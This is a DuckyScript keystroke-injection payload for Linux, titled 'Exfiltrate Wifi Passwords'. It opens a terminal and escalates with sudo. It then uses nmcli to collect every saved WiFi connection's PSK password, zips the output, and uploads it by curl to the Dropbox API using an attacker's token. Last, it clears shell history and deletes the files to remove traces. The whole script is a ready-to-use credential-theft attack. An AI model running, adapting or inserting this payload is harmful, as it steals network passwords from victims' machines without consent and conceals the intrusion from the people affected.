
REM_BLOCK
#######################################################
#                                                     #
# Title        : Exfiltrate Wifi Passwords - Linux    #
# Author       : Aleff                                #
# Version      : 1.0                                  #
# Category     : Exfiltration, Credentials, Execution #
# Target       : Linux                                #
#                                                     #
#######################################################
END_REM

REM Requirements:
REM     - Permissions
REM     - Internet connection
REM     - Dropbox Token

EXTENSION DETECT_READY
    REM VERSION 1.1
    REM AUTHOR: Korben

    REM_BLOCK DOCUMENTATION
        USAGE:
            Extension runs inline (here)
            Place at beginning of payload (besides ATTACKMODE) to act as dynamic
            boot delay

        TARGETS:
            Any system that reflects CAPSLOCK will detect minimum required delay
            Any system that does not reflect CAPSLOCK will hit the max delay of 3000ms
    END_REM

    REM CONFIGURATION:
    DEFINE #RESPONSE_DELAY 25
    DEFINE #ITERATION_LIMIT 120

    VAR $C = 0
    WHILE (($_CAPSLOCK_ON == FALSE) && ($C < #ITERATION_LIMIT))
        CAPSLOCK
        DELAY #RESPONSE_DELAY
        $C = ($C + 1)
    END_WHILE
    CAPSLOCK
END_EXTENSION

CTRL-ALT t
DELAY 2000

REM #### PREREQUISITES SECTION ####
REM Required: You need to know the sudo password and replace 'example' with this
DEFINE SUDO_PASS example
STRING sudo su
ENTER

DELAY 1000
STRING SUDO_PASS
ENTER

DELAY 2000
REM Required: Set here your Dropbox access TOKEN
DEFINE TOKEN example
STRING ACCESS_TOKEN="
STRING TOKEN
STRING "
ENTER


REM #### ZIP SECTION ####
DELAY 500
STRING RANDOM=$(shuf -i 1-999999999999 -n 1)
ENTER

DELAY 500
STRING ZIP_NAME="$RANDOM.zip"
ENTER

DELAY 500
STRING TMP_FOLDER_PATH=$(mktemp -d -p "/home" prefix-XXXXXXXXXX)
ENTER

DELAY 500
STRING ZIP_PATH="/home/$ZIP_NAME"
ENTER


REM #### WiFi && ZIP SECTION ####
REM Get all WiFi data
STRING for conn in $(nmcli connection show | grep wifi | awk '{print $1}'); do
ENTER
DELAY 500
STRING     nmcli connection show $conn >> "$TMP_FOLDER_PATH/output_verbose.txt" -
ENTER
DELAY 500
STRING     nmcli connection show $conn | grep psk >> "$TMP_FOLDER_PATH/output.txt" -
ENTER
DELAY 500
STRING done
ENTER
DELAY 500
REM Wifi exfiltration command time - It depends
DELAY 1000

STRING zip -r "$ZIP_PATH" "$TMP_FOLDER_PATH"
REM Zip operation time - It depends
DELAY 3000


REM #### EXFILTRATE SECTION ####
REM Set yout Dropbox folder name
DEFINE DROPBOX_FOLDER_NAME example
STRING DROPBOX_FOLDER="/
ENTER
STRING DROPBOX_FOLDER_NAME
ENTER
STRING "
ENTER
DELAY 500

DEFINE DROPBOX_API_CONST https://content.dropboxapi.com/2/files/upload
STRING curl -X POST
STRING DROPBOX_API_CONST
STRING --header "Authorization: Bearer $ACCESS_TOKEN" --header "Dropbox-API-Arg: {\"path\": \"$DROPBOX_FOLDER\",\"mode\": \"add\",\"autorename\": true,\"mute\": false}" --header "Content-Type: application/octet-stream" --data-binary "@$ZIP_PATH"
ENTER


REM #### REMOVE TRACES ####
DELAY 2000
STRING history -c
ENTER

DELAY 500
STRING rm -rf "$TMP_FOLDER_PATH"
ENTER

DELAY 500
STRING rm -rf "$ZIP_PATH"
ENTER

DELAY 500
STRING exit
ENTER

DELAY 500
STRING exit
ENTER
